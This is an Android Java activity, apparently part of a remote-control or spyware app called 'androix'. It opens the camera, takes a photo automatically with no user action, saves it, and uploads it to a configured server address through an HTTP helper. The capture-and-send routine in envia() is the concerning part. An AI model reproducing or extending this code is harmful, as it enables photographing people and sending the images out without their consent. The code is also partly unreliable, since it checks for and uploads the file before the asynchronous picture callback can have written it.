package com.androix;

import android.app.Activity;
import android.graphics.Camera;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;


public class Foto extends Activity implements SurfaceHolder.Callback{

    android.hardware.Camera camera;
    SurfaceView surfaceView;
    SurfaceHolder surfaceHolder;

    android.hardware.Camera.PictureCallback jpegCallback;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.camera);

        surfaceView = (SurfaceView) findViewById(R.id.surface);
        surfaceHolder = surfaceView.getHolder();

        surfaceHolder.addCallback(this);

        surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);


        jpegCallback = new android.hardware.Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, android.hardware.Camera camera) {
                FileOutputStream outStream = null;
                try{
                    outStream = new FileOutputStream( Config.DIR_FOTO() );
                    outStream.write(data);
                    outStream.close();
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        };
    }


    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try{
            camera = android.hardware.Camera.open();
        }catch (Exception e){
            e.printStackTrace();
        }

        android.hardware.Camera.Parameters param ;
        param = camera.getParameters();
        param.setJpegQuality(100);
        try{
            camera.setParameters(param);
            camera.setPreviewDisplay(surfaceHolder);
            camera.startPreview();
            envia();
        }catch(Exception e){
            Log.i("Error foto:", e.getMessage());
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        camera.stopPreview();
        camera.release();
        camera = null;
        finish();
    }


    private void envia(){
        camera.takePicture(null, null, jpegCallback);
        File f = new File(Config.DIR_FOTO());

        if (f.exists()){
            String response = new ConexaoHttp().upload(Config.SEND_FOTO, Config.DIR_FOTO());
            Log.i("Servidor Fotos:", response);
            finish();
        }

    }
}
